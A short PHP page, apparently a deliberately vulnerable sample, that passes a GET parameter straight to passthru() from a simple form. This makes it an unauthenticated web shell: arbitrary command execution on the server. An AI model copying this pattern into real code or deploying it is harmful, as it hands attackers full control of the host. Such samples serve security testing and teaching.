<?php
// I am using passthru function in code.

class systemManager{
  public function systemRunCommand($userInputData){
    $response = passthru($userInputData);  
    return $response;
 }
}


if($_SERVER['REQUEST_METHOD'] == 'GET'){
  if(isset($_GET['userData']) && !empty($_GET['userData'])){
    $userInputData = $_GET['userData'];
    $systemManager = new systemManager; } ?>
    <pre><?php echo json_encode($systemManager->systemRunCommand($userInputData)); ?></pre>
  <?php   
  }
  
?>

<html>
  <head></head>
  <body>
   
    <form action="" method="get">
        <input type="" name="userData">
        <input type="submit" value="gonder">
   </form>

  </body>
</html>
